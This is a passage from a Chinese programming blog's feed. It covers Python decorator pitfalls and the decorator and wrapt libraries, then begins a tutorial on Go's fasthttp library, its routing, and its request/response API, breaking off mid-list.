class="line">    </div><div class="line">    A class method receives the class as implicit first argument,</div><div class="line">    just like an instance method receives the instance.</div><div class="line">    To declare a class method, use this idiom:</div><div class="line">    </div><div class="line">      class C:</div><div class="line">          def f(cls, arg1, arg2, ...): ...</div><div class="line">          f = classmethod(f)</div><div class="line">    </div><div class="line">    It can be called either on the class (e.g. C.f()) or on an instance</div><div class="line">    (e.g. C().f()).  The instance is ignored except for its class.</div><div class="line">    If a class method is called for a derived class, the derived class</div><div class="line">    object is passed as the implied first argument.</div><div class="line">    </div><div class="line">    Class methods are different than C++ or Java static methods.</div><div class="line">    If you want those, see the staticmethod builtin.</div><div class="line">    """</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, function)</span>:</span> <span class="comment"># real signature unknown; restored from __doc__</span></div><div class="line">        <span class="keyword">pass</span></div><div class="line">    </div><div class="line">    ...</div></pre></td></tr></table></figure></p>
<h2 id="需要注意的问题"><a href="#需要注意的问题" class="headerlink" title="需要注意的问题"></a>需要注意的问题</h2><p>装饰器可以让你代码更加优雅，减少重复，但也不全是优点，也会带来一些问题。</p>
<h3 id="位置错误"><a href="#位置错误" class="headerlink" title="位置错误"></a>位置错误</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">html_tags</span><span class="params">(tag_name)</span>:</span></div><div class="line">    print(<span class="string">'begin outer function.'</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(func)</span>:</span></div><div class="line">        print(<span class="string">"begin of inner wrapper function."</span>)</div><div class="line"></div><div class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></div><div class="line">            content = func(*args, **kwargs)</div><div class="line">            print(<span class="string">"&lt;&#123;tag&#125;&gt;&#123;content&#125;&lt;/&#123;tag&#125;&gt;"</span>.format(tag=tag_name, content=content))</div><div class="line">            print(<span class="string">'end of inner wrapper function.'</span>)</div><div class="line"></div><div class="line">        <span class="keyword">return</span> wrapper</div><div class="line"></div><div class="line">    print(<span class="string">'end of outer function'</span>)</div><div class="line">    <span class="keyword">return</span> wrapper</div><div class="line"></div><div class="line"><span class="meta">@html_tags('b')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">(name=<span class="string">'Toby'</span>)</span>:</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'Hello &#123;&#125;!'</span>.format(name)</div><div class="line"></div><div class="line"></div><div class="line">hello()</div><div class="line">hello()</div></pre></td></tr></table></figure>
<p>在装饰器中我在各个可能的位置都加上了 print 语句，用于记录被调用的情况。你知道他们最后打印出来的顺序吗？如果你心里没底，那么最好不要在装饰器函数之外添加逻辑功能，否则这个装饰器就不受你控制了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">begin outer function.</div><div class="line">end of outer function</div><div class="line">begin of inner wrapper function.</div><div class="line">&lt;b&gt;Hello Toby!&lt;/b&gt;</div><div class="line">end of inner wrapper function.</div><div class="line">&lt;b&gt;Hello Toby!&lt;/b&gt;</div><div class="line">end of inner wrapper function.</div></pre></td></tr></table></figure></p>
<h3 id="函数签名和文档"><a href="#函数签名和文档" class="headerlink" title="函数签名和文档"></a>函数签名和文档</h3><p>使用装饰器后实际上函数的前面和文档都会被替换成wrapper的，虽然我们可以简单处理过来,但是这并不是完美的解决之道<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> inspect</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(level=<span class="string">'INFO'</span>)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorator</span><span class="params">(cls)</span>:</span></div><div class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></div><div class="line">            print(<span class="string">"[&#123;&#125;]: enter &#123;&#125; class"</span>.format(level, cls.__name__))</div><div class="line">            <span class="keyword">return</span> cls(*args, **kwargs)</div><div class="line"></div><div class="line">        wrapper.__name__ = cls.__name__</div><div class="line">        <span class="keyword">return</span> wrapper</div><div class="line">    <span class="keyword">return</span> decorator</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">@debug()</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, value)</span>:</span></div><div class="line">        self.value = value</div><div class="line"></div><div class="line"><span class="meta">@debug("ERROR")</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">(name)</span>:</span></div><div class="line">    print(<span class="string">"hello %s"</span> % name)</div><div class="line"></div><div class="line">h = Hello(<span class="string">"Bob"</span>)</div><div class="line">hello(<span class="string">"Bob"</span>)</div><div class="line">print(Hello.__name__)</div><div class="line">print(hello.__name__)</div><div class="line"></div><div class="line">print(inspect.getsource(Hello))</div><div class="line">print(inspect.getsource(hello))</div></pre></td></tr></table></figure></p>
<h3 id="staticmethod和classmethod不能再次装饰"><a href="#staticmethod和classmethod不能再次装饰" class="headerlink" title="staticmethod和classmethod不能再次装饰"></a>staticmethod和classmethod不能再次装饰</h3><p>当你想把装饰器用在一个静态方法或者类方法时，不好意思，报错了。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(level=<span class="string">'INFO'</span>)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorator</span><span class="params">(cls)</span>:</span></div><div class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></div><div class="line">            print(<span class="string">"[&#123;&#125;]: enter &#123;&#125; class"</span>.format(level, cls.__name__))</div><div class="line">            <span class="keyword">return</span> cls(*args, **kwargs)</div><div class="line"></div><div class="line">        wrapper.__name__ = cls.__name__</div><div class="line">        <span class="keyword">return</span> wrapper</div><div class="line">    <span class="keyword">return</span> decorator</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span><span class="params">(object)</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, model)</span>:</span></div><div class="line">        self.model = model</div><div class="line"></div><div class="line"><span class="meta">    @debug  # 装饰实例方法，OK</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">        print(<span class="string">"&#123;&#125; is running!"</span>.format(self.model))</div><div class="line"></div><div class="line"><span class="meta">    @debug  # 装饰静态方法，Failed</span></div><div class="line"><span class="meta">    @staticmethod</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_model_for</span><span class="params">(obj)</span>:</span></div><div class="line">        <span class="keyword">if</span> isinstance(obj, Car):</div><div class="line">            print(<span class="string">"The model of your car is &#123;&#125;"</span>.format(obj.model))</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            print(<span class="string">"&#123;&#125; is not a car!"</span>.format(obj))</div><div class="line"></div><div class="line"></div><div class="line">car = Car(<span class="string">'six'</span>)</div><div class="line">car.check_model_for(car)</div></pre></td></tr></table></figure></p>
<p>前面已经解释了@staticmethod这个装饰器，其实它返回的并不是一个<code>callable</code>对象，而是一个<code>staticmethod</code>对象，那么它是不符合装饰器要求的（比如传入一个<code>callable</code>对象），你自然不能在它之上再加别的装饰器。要解决这个问题很简单，只要把你的装饰器放在@staticmethod之前就好了，因为你的装饰器返回的还是一个正常的函数，然后再加上一个@staticmethod是不会出问题的。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(level=<span class="string">'INFO'</span>)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorator</span><span class="params">(cls)</span>:</span></div><div class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></div><div class="line">            print(<span class="string">"[&#123;&#125;]: enter &#123;&#125; class"</span>.format(level, cls.__name__))</div><div class="line">            <span class="keyword">return</span> cls(*args, **kwargs)</div><div class="line"></div><div class="line">        wrapper.__name__ = cls.__name__</div><div class="line">        <span class="keyword">return</span> wrapper</div><div class="line">    <span class="keyword">return</span> decorator</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span><span class="params">(object)</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, model)</span>:</span></div><div class="line">        self.model = model</div><div class="line"></div><div class="line"><span class="meta">    @debug()  # 装饰实例方法，OK</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">        print(<span class="string">"&#123;&#125; is running!"</span>.format(self.model))</div><div class="line"></div><div class="line"><span class="meta">    @staticmethod</span></div><div class="line"><span class="meta">    @debug()  # 静态装饰器放到最后就ok了</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_model_for</span><span class="params">(obj)</span>:</span></div><div class="line">        <span class="keyword">if</span> isinstance(obj, Car):</div><div class="line">            print(<span class="string">"The model of your car is &#123;&#125;"</span>.format(obj.model))</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            print(<span class="string">"&#123;&#125; is not a car!"</span>.format(obj))</div><div class="line"></div><div class="line"></div><div class="line">car = Car(<span class="string">'six'</span>)</div><div class="line">car.check_model_for(car)</div></pre></td></tr></table></figure></p>
<h2 id="利用第三方库来写装饰器"><a href="#利用第三方库来写装饰器" class="headerlink" title="利用第三方库来写装饰器"></a>利用第三方库来写装饰器</h2><p>嵌套的装饰函数不太直观，我们可以使用第三方包类改进这样的情况，让装饰器函数可读性更好。</p>
<h3 id="decorator"><a href="#decorator" class="headerlink" title="decorator"></a>decorator</h3><p>decorator.py是一个非常简单的装饰器加强包。你可以很直观的先定义包装函数wrapper() ，再使用decorate(func, wrapper)方法就可以完成一个装饰器。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@decorator</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(func, *args, **kwargs)</span>:</span></div><div class="line">    print(<span class="string">"[DEBUG] &#123;&#125;: enter &#123;&#125;()"</span>.format(datetime.now(), func.__name__))</div><div class="line">    <span class="keyword">return</span> func(*args, **kwargs)</div><div class="line"></div><div class="line"><span class="meta">@debug</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">(name)</span>:</span></div><div class="line">    <span class="string">"""test"""</span></div><div class="line">    print(<span class="string">"hello %s"</span> % name)</div><div class="line"></div><div class="line"><span class="meta">@debug</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span><span class="params">(object)</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name)</span>:</span></div><div class="line">        self.name = name</div><div class="line"></div><div class="line">hello(<span class="string">"Bob"</span>)</div><div class="line"></div><div class="line">print(inspect.getsource(hello))</div><div class="line">print(hello.__name__)</div></pre></td></tr></table></figure></p>
<p>decorator比较简陋, 要装饰类和带参数的装饰就不能很好支持了。</p>
<h3 id="wrapt"><a href="#wrapt" class="headerlink" title="wrapt"></a>wrapt</h3><p>wrapt是一个功能非常完善的包，用于实现各种你想到或者你没想到的装饰器。使用 wrapt 实现的装饰器你不需要担心之前 inspect 中遇到的所有问题，因为它都帮你处理了，甚至 inspect.getsource ( func ) 也准确无误<br>更全面的文档可以参考<a href="http://wrapt.readthedocs.io/en/latest/decorators.html#decorating-classes" target="_blank" rel="external">wrapt官方文档</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</div><div class="line"><span class="keyword">import</span> wrapt</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(level=<span class="string">'INFO'</span>)</span>:</span></div><div class="line"><span class="meta">    @wrapt.decorator</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(wrapped, instance, args, kwargs)</span>:</span></div><div class="line">        print(<span class="string">"[&#123;&#125;]: &#123;&#125; message"</span>.format(level, datetime.now()))</div><div class="line">        <span class="keyword">return</span> wrapped(*args, **kwargs)</div><div class="line">    <span class="keyword">return</span> wrapper</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Class</span><span class="params">(object)</span>:</span></div><div class="line"></div><div class="line"><span class="meta">    @debug()</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">function_im</span><span class="params">(self, arg1, arg2)</span>:</span></div><div class="line">        <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="meta">    @debug("DEBUG")</span></div><div class="line"><span class="meta">    @classmethod</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">function_cm</span><span class="params">(cls, arg1, arg2)</span>:</span></div><div class="line">        <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="meta">    @debug("ERROR")</span></div><div class="line"><span class="meta">    @staticmethod</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">function_sm</span><span class="params">(arg1, arg2)</span>:</span></div><div class="line">        <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="meta">@debug()</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span><span class="params">()</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name)</span>:</span></div><div class="line">        self.name = name</div><div class="line"><span class="meta">@debug()</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">(name)</span>:</span></div><div class="line">    print(<span class="string">"hello %s"</span> % name)</div><div class="line"></div><div class="line"></div><div class="line">c = Class()</div><div class="line"></div><div class="line">c.function_im(<span class="number">1</span>, <span class="number">2</span>)</div><div class="line">Class.function_im(c, <span class="number">1</span>, <span class="number">2</span>)</div><div class="line">Class.function_cm(<span class="number">1</span>, <span class="number">2</span>)</div><div class="line">Class.function_sm(<span class="number">1</span>, <span class="number">2</span>)</div><div class="line"></div><div class="line">h = Hello(<span class="string">"Bob"</span>)</div><div class="line">hello(<span class="string">"Bob"</span>)</div></pre></td></tr></table></figure></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>装饰器的理念是对原函数、对象的加强，相当于重新封装，所以一般装饰器函数都被命名为wrapper() ，意义在于包装。函数只有在被调用时才会发挥其作用。比如@debug 装饰器可以在函数执行时额外输出日志， @cache装饰过的函数可以缓存计算结果等等。<br>最后避免重复造轮子推荐使用wrapt，除非wrapt真不能满足你的特性需求。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;装饰器是一个非常重要的概念，可能算是进阶的一大门槛。装饰器允许向一个现有的对象添加新的功能，同时又不改变其结构,是一种功能增强的模式。在面向对象(OOP)的设计模式中，decorator被称为装饰模式。OOP的装饰模式需要通过继承和组合来实现，而Python除了能支持OOP的decorator外，直接从语法层次支持decorator。Python的decorator可以用函数实现，也可以用类实现。接下来将全面介绍关于Python装饰器相关的知识。&lt;br&gt;
    
    </summary>
    
      <category term="开发语言" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/"/>
    
      <category term="Python" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/Python/"/>
    
    
      <category term="deractor" scheme="https://blog.yumaojun.net/tags/deractor/"/>
    
  </entry>
  
  <entry>
    <title>高性能web之fasthttp</title>
    <link href="https://blog.yumaojun.net/2017/01/25/fasthttp/"/>
    <id>https://blog.yumaojun.net/2017/01/25/fasthttp/</id>
    <published>2017-01-25T06:18:39.000Z</published>
    <updated>2017-02-03T17:29:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>浏览网上博客时发现了这么一篇测试文章<a href="http://www.qingpingshan.com/jb/go/148453.html" target="_blank" rel="external">nginx vs iris</a>, 结果是<code>iris</code>越胜一筹, 而<code>Iris</code>底层使用的并不是Golang的HTTP的标准库, 而是使用的第三方库<code>fasthttp</code>, 之前读过一点关于golang的<code>net/http</code>, 在处理用户的请求时的确有点粗暴, 直接一个连接一个<code>goroutine</code>, 完全没有并发的控制。按捺不做内心的好奇, 想感受一把<code>fasthttp</code>, 来一起走进fasthttp的世界看看。<br><a id="more"></a></p>
<h2 id="Benchmark的的胜出"><a href="#Benchmark的的胜出" class="headerlink" title="Benchmark的的胜出"></a>Benchmark的的胜出</h2><p>github上面有一个好事者写了一个Go Web框架性能的压测工具, 结果是<code>fasthttp</code>表现非常优异, 具体请查看<a href="https://github.com/smallnest/go-web-framework-benchmark" target="_blank" rel="external">go-web-framework-benchmark github地址</a><br>请允许我贴一张他的图<br><img src="http://oiw1gzfww.bkt.clouddn.com/benchmark__latency.png" alt=""></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><code>fasthttp</code>是<code>Go</code>的HTTP的第三方实现, 它宣称比标准库<code>net/http</code>快10倍, 是一款高性能的HTTP实现。Github中的<code>Fasthttp best practices</code>这段描述了它为啥高性能的原因</p>
<ul>
<li>net/http 的实现是一个连接新建一个 goroutine; <code>fasthttp</code>是利用一个 worker 复用 goroutine，减轻 runtime 调度 goroutine 的压力</li>
<li>net/http 解析的请求数据很多放在 map[string]string (http.Header) 或 map[string][]string (http.Request.Form)，有不必要的 []byte 到 string 的转换，是可以规避的</li>
<li>net/http 解析 HTTP 请求每次生成新的 <em>http.Request 和 http.ResponseWriter; <code>fasthttp</code>解析 HTTP 数据到 </em>fasthttp.RequestCtx ，然后使用 sync.Pool复用结构实例，减少对象的数量</li>
<li><code>fasthttp</code>会延迟解析 HTTP 请求中的数据，尤其是 Body 部分。这样节省了很多不直接操作 Body 的情况的消耗</li>
</ul>
<p>但是因为<code>fasthttp</code>的实现与标准库差距较大，所以<code>API</code>的设计完全不同, 因此也不兼容标准库<code>net/http</code>。使用时既需要理解<code>HTTP</code>的处理过程，又需要注意和标准库的差别。</p>
<h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><p>基本用法很简单, 1. 写好handler 2. 监听交给handler处理.<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"fmt"</span></div><div class="line"></div><div class="line">	<span class="string">"github.com/valyala/fasthttp"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="comment">// 使用RequestCtx传递HTTP的数据</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">httpHandler</span><span class="params">(ctx *fasthttp.RequestCtx)</span></span> &#123;</div><div class="line">	fmt.Fprint(ctx, <span class="string">"hello fasthttp"</span>)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 启动服务时指定处理任务的handler</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	<span class="keyword">if</span> err := fasthttp.ListenAndServe(<span class="string">"0.0.0.0:8080"</span>, httpHandler); err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(<span class="string">"start fasthttp fail:"</span>, err.Error())</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><p><code>net/http</code>提供<code>http.ServeMux</code>实现路由服务，但是匹配规则简陋，功能很简单，基本不会使用。 <code>fasthttp</code>吸取教训，默认没有提供路由支持。官方提到了4个路由实现: <code>Iris</code>, <code>fasthttp-routing</code>, <code>fasthttproute</code>, <code>lu</code>, 第一个是框架, 第二三个是单纯的路由, 第4个不知道。我这里选择<code>fasthttprouter</code>, 因为github上面这个项目文档和活跃度比较不错</p>
<h3 id="安装fasthttprouter"><a href="#安装fasthttprouter" class="headerlink" title="安装fasthttprouter"></a>安装fasthttprouter</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">➜  Blogs go get -u -v &quot;github.com/buaazp/fasthttprouter&quot;</div><div class="line">github.com/buaazp/fasthttprouter (download)</div><div class="line">github.com/valyala/fasthttp (download)</div><div class="line">github.com/klauspost/compress (download)</div><div class="line">github.com/klauspost/cpuid (download)</div><div class="line">github.com/klauspost/crc32 (download)</div><div class="line">github.com/valyala/bytebufferpool (download)</div><div class="line">github.com/buaazp/fasthttprouter</div></pre></td></tr></table></figure>
<h3 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h3><p>详尽的使用还得去看Github或者源码, 请允许我贴一段官方的代码, 我本地也用着这个测<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"log"</span></div><div class="line"></div><div class="line">	<span class="string">"github.com/buaazp/fasthttprouter"</span></div><div class="line">	<span class="string">"github.com/valyala/fasthttp"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(ctx *fasthttp.RequestCtx)</span></span> &#123;</div><div class="line">	fmt.Fprint(ctx, <span class="string">"Welcome!\n"</span>)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">Hello</span><span class="params">(ctx *fasthttp.RequestCtx)</span></span> &#123;</div><div class="line">	fmt.Fprintf(ctx, <span class="string">"hello, %s!\n"</span>, ctx.UserValue(<span class="string">"name"</span>))</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	router := fasthttprouter.New()</div><div class="line">	router.GET(<span class="string">"/"</span>, Index)</div><div class="line">	router.GET(<span class="string">"/hello/:name"</span>, Hello)</div><div class="line"></div><div class="line">	log.Fatal(fasthttp.ListenAndServe(<span class="string">":8080"</span>, router.Handler))</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="请求和响应"><a href="#请求和响应" class="headerlink" title="请求和响应"></a>请求和响应</h2><p>在fasthttp中使用一个对象来维护请求的上下文:<code>RequestCtx</code>, 它综合了<code>http.Request</code>和<code>http.ResponseWriter</code>的操作，可以更方便的读取和返回数据, 通过下图这种对照表我们可以清晰的看出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">r.Body -&gt; ctx.PostBody()</div><div class="line">r.URL.Path -&gt; ctx.Path()</div><div class="line">r.URL -&gt; ctx.URI()</div><div class="line">r.Method -&gt; ctx.Method()</div><div class="line">r.Header -&gt; ctx.Request.Header</div><div class="line">r.Header.Get() -&gt; ctx.Request.Header.Peek()</div><div class="line">r.Host -&gt; ctx.Host()</div><div class="line">r.Form -&gt; ctx.QueryArgs() + ctx.PostArgs()</div><div class="line">r.PostForm -&gt; ctx.PostArgs()</div><div class="line">r.FormValue() -&gt; ctx.FormValue()</div><div class="line">r.FormFile() -&gt; ctx.FormFile()</div><div class="line">r.MultipartForm -&gt; ctx.MultipartForm()</div><div class="line">r.RemoteAddr -&gt; ctx.RemoteAddr()</div><div class="line">r.RequestURI -&gt; ctx.RequestURI()</div><div class="line">r.TLS -&gt; ctx.IsTLS()</div><div class="line">r.Cookie() -&gt; ctx.Request.Header.Cookie()</div><div class="line">r.Referer() -&gt; ctx.Referer()</div><div class="line">r.UserAgent() -&gt; ctx.UserAgent()</div><div class="line">w.Header() -&gt; ctx.Response.Header</div><div class="line">w.Header().Set() -&gt; ctx.Response.Header.Set()</div><div class="line">w.Header().Set(&quot;Content-Type&quot;) -&gt; ctx.SetContentType()</div><div class="line">w.Header().Set(&quot;Set-Cookie&quot;) -&gt; ctx.Response.Header.SetCookie()</div><div class="line">w.Write() -&gt; ctx.Write(), ctx.SetBody(), ctx.SetBodyStream(), ctx.SetBodyStreamWriter()</div><div class="line">w.WriteHeader() -&gt; ctx.SetStatusCode()</div><div class="line">w.(http.Hijacker).Hijack() -&gt; ctx.Hijack()</div><div class="line">http.Error() -&gt; ctx.Error()</div><div class="line">http.FileServer() -&gt; fasthttp.FSHandler(), 